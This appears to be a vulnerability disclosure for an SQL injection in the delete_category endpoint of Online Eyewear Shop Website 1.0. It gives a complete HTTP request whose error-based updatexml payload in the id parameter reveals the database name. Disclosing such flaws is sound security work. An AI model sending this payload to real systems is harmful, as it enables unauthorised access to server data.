## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
/oews/classes/Master.php?f=delete_category

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in /oews/classes/Master.php?f=delete_category, and the attack parameter is id. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
POST /oews/classes/Master.php?f=delete_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 62
Origin: http://localhost
Connection: close
Referer: http://localhost/oews/admin/?page=categories
Cookie: PHPSESSID=af5dsp386jat1uspen8v4e8hhq
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

id=3%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

Get the database name directly through the error report: oews_db

![CleanShot 2024-09-24 at 10 26 01@2x](https://github.com/user-attachments/assets/d1e7839b-1e61-4f81-b9e5-d30f34d3f996)

## Code Analysis

![CleanShot 2024-09-24 at 10 27 45@2x](https://github.com/user-attachments/assets/3d6e0fd3-8fee-48b9-8895-9679bd1f7a57)


